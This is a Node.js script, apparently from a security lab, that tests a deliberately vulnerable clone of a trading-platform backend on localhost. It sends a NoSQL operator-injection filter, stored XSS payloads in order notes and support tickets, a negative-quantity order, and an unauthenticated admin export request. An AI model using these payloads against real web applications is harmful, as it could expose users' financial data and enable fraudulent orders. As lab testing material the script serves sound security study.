const http = require("http");

function request(options, postData) {
  return new Promise((resolve, reject) => {
    const req = http.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => resolve({ statusCode: res.statusCode, headers: res.headers, body: data }));
    });
    req.on("error", (err) => reject(err));
    if (postData) {
      req.write(postData);
    }
    req.end();
  });
}

async function runTests() {
  console.log("=== Testing Vulnerable Zerodha Backend ===");

  // 1. Attack 5: API Abuse / Unbounded Result Sets
  console.log("\n[Test 1] Attack 5: API Abuse (GET /allHoldings)");
  const resHoldings = await request({
    host: "localhost",
    port: 3002,
    path: "/allHoldings",
    method: "GET",
  });
  console.log("Status:", resHoldings.statusCode);
  console.log("Body length:", resHoldings.body.length);

  // 2. Attack 1: NoSQL Injection (GET /allOrders with operator filter)
  console.log("\n[Test 2] Attack 1: NoSQL Injection (GET /allOrders?filter=...)");
  const filterQuery = encodeURIComponent(JSON.stringify({ qty: { $gt: 0 } }));
  const resNoSql = await request({
    host: "localhost",
    port: 3002,
    path: `/allOrders?filter=${filterQuery}`,
    method: "GET",
  });
  console.log("Status:", resNoSql.statusCode);
  console.log("Sample Body:", resNoSql.body.slice(0, 100));

  // 3. Attack 2 & 4: Business Logic & Stored XSS (POST /newOrder)
  console.log("\n[Test 3] Attack 2 & 4: Business Logic + Stored XSS (POST /newOrder)");
  const orderPayload = JSON.stringify({
    name: "RELIANCE",
    qty: -5,
    price: 0.001,
    mode: "BUY",
    notes: "<img src=x onerror=alert('XSS_ORDER')>",
  });
  const resNewOrder = await request(
    {
      host: "localhost",
      port: 3002,
      path: "/newOrder",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(orderPayload),
      },
    },
    orderPayload
  );
  console.log("Status:", resNewOrder.statusCode);
  console.log("Response:", resNewOrder.body);

  // 4. Attack 2: Stored XSS in Support Tickets (POST /newTicket)
  console.log("\n[Test 4] Attack 2: Stored XSS Ticket (POST /newTicket)");
  const ticketPayload = JSON.stringify({
    topic: "Account Security",
    email: "tester@security.lab",
    message: "<script>alert('XSS_TICKET')</script>",
  });
  const resNewTicket = await request(
    {
      host: "localhost",
      port: 3002,
      path: "/newTicket",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(ticketPayload),
      },
    },
    ticketPayload
  );
  console.log("Status:", resNewTicket.statusCode);
  console.log("Response:", resNewTicket.body);

  // 5. Query all tickets
  console.log("\n[Test 5] GET /allTickets");
  const resTickets = await request({
    host: "localhost",
    port: 3002,
    path: "/allTickets",
    method: "GET",
  });
  console.log("Status:", resTickets.statusCode);
  console.log("Sample Body:", resTickets.body.slice(0, 120));

  // 6. Attack 7: Broken Access Control (GET /admin/exportAll)
  console.log("\n[Test 6] Attack 7: Broken Access Control (GET /admin/exportAll)");
  const resExport = await request({
    host: "localhost",
    port: 3002,
    path: "/admin/exportAll",
    method: "GET",
  });
  console.log("Status:", resExport.statusCode);
  console.log("Body preview:", resExport.body.slice(0, 200));

  console.log("\n=== All Tests Finished ===");
}

runTests().catch(console.error);
